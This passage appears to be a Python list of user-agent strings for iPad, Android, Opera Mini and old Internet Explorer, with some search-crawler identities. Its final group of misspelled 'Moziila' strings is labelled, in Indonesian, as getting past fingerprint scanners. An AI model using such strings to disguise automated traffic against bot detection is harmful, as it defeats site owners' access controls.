    "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 [FBAN/FBIOS;FBAV/172.0.0.46.94]",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12B466 [FBAN/FBIOS;FBAV/37.0.0.21.273]",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 7_1 like Mac OS X) AppleWebKit (KHTML, like Gecko) Mobile (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b",

    # ── iPad ──
    "Mozilla/5.0 (iPad; CPU OS 14_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Mobile/15E148 DuckDuckGo/7 Safari/605.1.15",
    "Mozilla/5.0 (iPad; CPU OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.2 Mobile/15E148 DuckDuckGo/7 Safari/605.1.15",
    "Mozilla/5.0 (iPad; CPU OS 12_4_9 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.4 Mobile/15E148 DuckDuckGo/7 Safari/605.1.15",
    "Mozilla/5.0 (iPad; CPU OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.3 Mobile/15E148 DuckDuckGo/7 Safari/605.1.15",
    "Mozilla/5.0 (iPad; CPU OS 12_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/16C50 DuckDuckGo/7 Safari/605.1.15",
    "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
    "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12H321 Safari/600.1.4",
    "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H321 Safari/600.1.4",
    "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/8.0.57838 Mobile/12H321 Safari/600.1.4",
    "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4",
    "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12H143 Safari/600.1.4",
    "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H143 Safari/600.1.4",
    "Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4",
    "Mozilla/5.0 (iPad; CPU OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12D508 Safari/600.1.4",
    "Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4",
    "Mozilla/5.0 (iPad; CPU OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4",
    "Mozilla/5.0 (iPad; CPU OS 8_1_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B435 Safari/600.1.4",
    "Mozilla/5.0 (iPad; CPU OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B410 Safari/600.1.4",
    "Mozilla/5.0 (iPad; CPU OS 8_0_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A405 Safari/600.1.4",
    "Mozilla/5.0 (iPad; CPU OS 8_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A365 Safari/600.1.4",
    "Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53",
    "Mozilla/5.0 (iPad; CPU OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53",
    "Mozilla/5.0 (iPad; CPU OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D167 Safari/9537.53",
    "Mozilla/5.0 (iPad; CPU OS 7_0_6 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B651 Safari/9537.53",
    "Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53",
    "Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Mercury/8.7 Mobile/11B554a Safari/9537.53",
    "Mozilla/5.0 (iPad; CPU OS 7_0_3 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B511 Safari/9537.53",
    "Mozilla/5.0 (iPad; CPU OS 6_1_3 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B329 Safari/8536.25",
    "Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",

    # ── Android Chrome modern ──
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; 2109119DG Build/TQ3C.230805.001.B2) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.168 Mobile Safari/537.36 GNews Android/2022148526",
    "Mozilla/5.0 (Linux; Android 13; SM-A536B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 GNews Android/2022148538",
    "Mozilla/5.0 (Linux; Android 13; SM-S911B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/415.0.0.34.107;]",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro Build/TQ2A.230505.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.132 Mobile Safari/537.36 GNews Android/2022131834",
    "Mozilla/5.0 (Linux; Android 13; SM-A546B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.131 Mobile Safari/537.36 GNews Android/2022131834",
    "Mozilla/5.0 (Linux; Android 13; M2101K9AG Build/TKQ1.221013.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.168 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108;]",
    "Mozilla/5.0 (Linux; Android 13; CPH2333 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.60 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63;]",
    "Mozilla/5.0 (Linux; Android 12; Mi Note 10 Lite Build/SKQ1.210908.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.132 Mobile Safari/537.36 GNews Android/2022131834",
    "Mozilla/5.0 (Linux; Android 12; moto e22 Build/SOV32.121-40; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.163 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/415.0.0.34.107;]",
    "Mozilla/5.0 (Linux; Android 12; CPH2219 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/400.0.0.37.76;]",
    "Mozilla/5.0 (Linux; Android 11; SM-A307FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108;]",
    "Mozilla/5.0 (Linux; Android 11; WP5 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]",

    # ── Android Chrome lama ──
    "Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022150842",
    "Mozilla/5.0 (Linux; Android 10; BLA-L09 Build/HUAWEIBLA-L09S; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]",
    "Mozilla/5.0 (Linux; Android 10; Redmi 8 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.163 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/415.0.0.34.107;]",
    "Mozilla/5.0 (Linux; Android 10; SM-A515F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/415.0.0.34.107;]",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36 [ip:59.149.72.73]",
    "Mozilla/5.0 (Linux; Android 9; SM-A307FN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]",
    "Mozilla/5.0 (Linux; Android 9; ANE-LX1 Build/HUAWEIANE-L01; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/415.0.0.34.107;]",
    "Mozilla/5.0 (Linux; Android 9; DUK-L09 Build/HUAWEIDUK-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.123 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/415.0.0.34.107;]",
    "Mozilla/5.0 (Linux; Android 9; RG655) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-N950F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/11.0 Chrome/75.0.3770.143 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Redmi Note 8 Build/PKQ1.190616.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36 YaApp_Android/9.99 YaSearchBrowser/9.99",
    "Mozilla/5.0 (Linux; Android 9; SM-G955F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36 YaApp_Android/9.99 YaSearchBrowser/9.99",
    "Mozilla/5.0 (Linux; Android 9; SM-J330FN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36 Instagram 167.0.0.24.120 Android (28/9; 320dpi; 720x1280; samsung; SM-J330FN; j3y17lte; samsungexynos7570; en_GB; 256966589)",
    "Mozilla/5.0 (Linux; Android 8.1.0; SM-J415F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.1.0; PSP5545DUO) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.0.0; ANE-LX1 Build/HUAWEIANE-LX1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/178.0.0.57.86;]",
    "Mozilla/5.0 (Linux; Android 7.1.1; MI 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.1.1; SGP771) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.1.1; ZTE BLADE A0621 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.0; SM-G903F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0.1; SM-A500F Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.87 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0.1; SM-A510F Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.158 Mobile Safari/537.36 Instagram 45.0.0.17.93 Android (23/6.0.1; 480dpi; 1920x1080; samsung; SM-A510F; a5xelte; samsungexynos7580; pt_PT; 108357722)",
    "Mozilla/5.0 (Linux; Android 5.1.1; A33f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320F Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/171.0.0.49.92;]",
    "Mozilla/5.0 (Linux; Android 5.1; A71 Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.1; XT1028) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.1; 5019D Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Mobile Safari/537.36 Instagram 118.0.0.28.122 Android (22/5.1; 240dpi; 480x854; TCL; 5019D; PIXI3_45_4G; mt6735; ru_RU; 181496409)",
    "Mozilla/5.0 (Linux; Android 5.1; m3 note Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.146 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/254.0.0.37.125;]",
    "Mozilla/5.0 (Linux; Android 5.0.2; HTC One M8s Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.0.2; SM-A500H Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.0.2; VF-1497 Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Safari/537.36 [FB_IAB/FB4A;FBAV/170.0.0.52.95;]",
    "Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.79 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.4.4; SM-G316M Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.4.2; Vodafone 785 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.4; Nexus 5 Build/_BuildID_) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.3; en-us; ZTE-Z667G Build/JLS36C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
    "Mozilla/5.0 (Linux; Android 4.0.3; en-us; KFTT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.0.4; en-us; KFJWI Build/IMM76D) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.4.3; en-us; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.4.3; en-us; KFASWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.4.3; en-us; KFAPWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.4.3; en-us; KFARWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.4.3; en-us; KFSOWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.0.3; en-us; KFOT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",

    # ── Android browser lain ──
    "Mozilla/5.0 (Linux; arm_64; Android 10; Mi 9 Lite) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 YaApp_Android/20.93.1 YaSearchBrowser/20.93.1 BroPP/1.0 SA/3 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; arm; Android 10; TECNO KD6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 YaBrowser/20.9.3.85.00 SA/3 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; arm_64; Android 9; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 YaBrowser/19.12.3.101.00 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; arm_64; Android 9; H4113) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 YaBrowser/23.3.5.83.00 SA/3 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; arm_64; Android 7.0; JMM-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 YaBrowser/19.12.4.87.00 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 8.1.0; en-gb; Redmi 6 Pro Build/OPM1.171019.019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/MiuiBrowser/9.6.9",
    "Mozilla/5.0 (Linux; U; Android 9; bg-bg; Redmi Note 7 Build/PKQ1.180904.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/11.4.3-g",

    # ── Opera Mini ──
    "Opera/9.80 (SpreadTrum; Opera Mini/4.4.33961/163.89; U; fr) Presto/2.12.423 Version/12.16",
    "Opera/9.80 (MAUI Runtime; Opera Mini/4.4.39014/163.89; U; uk) Presto/2.12.423 Version/12.16",
    "Opera/9.80 (Android; Opera Mini/7.5.35613/163.89; U; ru) Presto/2.12.423 Version/12.16",
    "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",

    # ── IE lama ──
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; GTB7.5; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; McAfee; .NET4.0E; .NET4.0C; MATM)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E; MS-RTC LM 8)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729; Tablet PC 2.0; McAfee; AmericasCardroom; BRI/2; GWX:DOWNLOADED)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; WOW64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729; GWX:QUALIFIED; MASMJS)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; ARM; Trident/7.0; Touch; .NET4.0E; .NET4.0C; Tablet PC 2.0)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
    "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
    "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch; MAARJS)",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0) LinkCheck by Siteimprove.com",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/7.0)",
    "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; Touch; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MAGWJS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MDDCJS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALNJS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; LCJB; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; LCJB; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; ASU2JS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; ASU2JS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MDDCJS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; ARM; Trident/7.0; Touch; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; NP06; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MDDCJS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MDDRJS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; yie11; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0; KTXN B671525283A77460T1297416P1) like Gecko",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0; KTXN B662165141A48129T1297416P2) like Gecko",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",

    # ── Typo legacy (lolos dari fingerprint scanner) ──
    "Moziila/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko",
    "Moziila/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
    "Moziila/5.0 (Windows NT 6.0; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0",
    "Moziila/5.0 (Linux; U; Android 4.3; en-us; ZTE-Z667G Build/JLS36C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
    "Moziila/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
    "Moziila/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; ASU2JS; rv:11.0) like Gecko",
    "Moziila/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
    "Moziila/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Moziila/5.0 (Windows NT 5.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36",
